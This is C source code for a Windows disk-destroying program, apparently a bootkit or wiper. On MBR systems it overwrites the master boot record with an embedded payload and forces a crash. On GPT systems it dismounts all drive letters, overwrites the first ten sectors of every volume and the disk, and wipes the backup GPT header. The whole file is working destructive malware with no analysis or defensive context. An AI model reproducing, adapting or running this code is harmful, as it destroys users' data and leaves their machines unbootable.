#include <Windows.h>
#include <iostream>
#include "data.h"

#define STATUS_HOST_DOWN 0xc0000350

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

signed int hard_reboot()
{
	BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(STATUS_HOST_DOWN, 0, 0, 0, 6, &uResp);
	return 0;
}
signed int destroy_backup_gpt_header()
{
	DWORD ReturnBytes;
	LPCVOID destroy_gpt_header;
	DISK_GEOMETRY OutBuffer1;
	GET_LENGTH_INFORMATION LengthInformation;

	HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	DeviceIoControl(disk, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer1, 0x18u, &ReturnBytes, 0); 

	DeviceIoControl(disk, IOCTL_DISK_GET_LENGTH_INFO, 0, NULL, &LengthInformation, sizeof(LengthInformation), &ReturnBytes, NULL); //Get full disk size

	destroy_gpt_header = LocalAlloc(0, 33 * OutBuffer1.BytesPerSector); //Allocate 33 sector size buffer

	LARGE_INTEGER gpt;
	gpt.QuadPart = LengthInformation.Length.QuadPart -33 * OutBuffer1.BytesPerSector;
	SetFilePointerEx(disk, gpt,NULL, FILE_BEGIN); //Move to the last sector of the drive and go backward 33 sectors
	WriteFile(disk, destroy_gpt_header, 33 * OutBuffer1.BytesPerSector, &ReturnBytes, 0); // overwrite last 33 sectors with a uninitialized buffer(destroy backup GPT Header)
	LocalFree((HLOCAL)destroy_gpt_header); //Local Free
	CloseHandle(disk); //Close handle to the disk
	return 0;
}
signed int infect_mbr()
{
	DWORD wb;
	char NewMbr[512];
	char oldMbr[512];
	ZeroMemory(&NewMbr, sizeof(NewMbr));
	ZeroMemory(&oldMbr, sizeof(oldMbr));
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	ReadFile(drive, oldMbr, 512, &wb, NULL);
	ZeroMemory(oldMbr, 440);
	memcpy(NewMbr,mbr,512);
	memcpy(NewMbr + 440, oldMbr + 440, 0x40);
	SetFilePointer(drive, 0,0, FILE_BEGIN);
	WriteFile(drive, NewMbr, 512, &wb, NULL);
	SetFilePointer(drive, 512,0, FILE_BEGIN);
	WriteFile(drive, kernel, 28672, &wb, NULL);
	CloseHandle(drive);
	return 0;
}
signed int Trash_10_Sectors()
{
  HANDLE device_handle; // ebx@1
  DISK_GEOMETRY OutBuffer; // [esp+10h] [ebp-20h]@3
  LPCVOID uninitialized_lpBuffer; // [esp+28h] [ebp-8h]@3
  DWORD BytesReturned; // [esp+2Ch] [ebp-4h]@3

  HANDLE hdd1 = CreateFileA("\\\\.\\A:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd2 = CreateFileA("\\\\.\\B:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd3 = CreateFileA("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd4 = CreateFileA("\\\\.\\D:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd5 = CreateFileA("\\\\.\\E:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd6 = CreateFileA("\\\\.\\F:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd7 = CreateFileA("\\\\.\\G:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd8 = CreateFileA("\\\\.\\H:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd9 = CreateFileA("\\\\.\\I:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd10 = CreateFileA("\\\\.\\J:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd11 = CreateFileA("\\\\.\\K:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd12 = CreateFileA("\\\\.\\L:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd13 = CreateFileA("\\\\.\\M:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd14 = CreateFileA("\\\\.\\N:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd15 = CreateFileA("\\\\.\\O:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd16 = CreateFileA("\\\\.\\P:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd17 = CreateFileA("\\\\.\\Q:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd18 = CreateFileA("\\\\.\\R:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd19 = CreateFileA("\\\\.\\S:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd20 = CreateFileA("\\\\.\\T:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd21 = CreateFileA("\\\\.\\U:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd22 = CreateFileA("\\\\.\\V:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);   
  HANDLE hdd23 = CreateFileA("\\\\.\\W:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd24 = CreateFileA("\\\\.\\X:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd25 = CreateFileA("\\\\.\\Y:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  HANDLE hdd26 = CreateFileA("\\\\.\\Z:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

  device_handle = CreateFileA("\\\\.\\PhysicalDrive0", 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( !device_handle )
    return 0;
  DeviceIoControl(device_handle, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0);
  uninitialized_lpBuffer = LocalAlloc(0, 10 * OutBuffer.BytesPerSector);// Allocate 10 sector size buffer
  if ( uninitialized_lpBuffer )
  {
    DeviceIoControl(device_handle, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd1, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd2, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd3, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd4, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd5, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd6, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd7, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd8, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd9, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd10, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd11, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd12, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd13, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd14, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd15, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd16, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd17, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd18, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd19, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd20, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd21, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd22, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd23, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd24, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd25, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
	DeviceIoControl(hdd26, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
    WriteFile(device_handle, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd1, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd2, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd3, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd4, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd5, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd6, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd7, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd8, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd9, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd10, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd11, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd12, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd13, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd14, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd15, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd16, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd17, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd18, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd19, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd20, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd21, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd22, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd23, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd24, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd25, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
	WriteFile(hdd26, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
    LocalFree((HLOCAL)uninitialized_lpBuffer);
  }
  CloseHandle(device_handle);
  return 1;
}

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
	DWORD NumberOfBytesReturned;
	HANDLE device = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(device,IOCTL_DISK_GET_PARTITION_INFO_EX,NULL,0,&info,sizeof(info),&NumberOfBytesReturned,NULL);
	{
		if(info.PartitionStyle == PARTITION_STYLE_MBR)
		{
			infect_mbr();
			hard_reboot();
		}
		else if(info.PartitionStyle == PARTITION_STYLE_GPT)
		{
			Trash_10_Sectors();
			destroy_backup_gpt_header();
			//hard_reboot();
		}
	}
}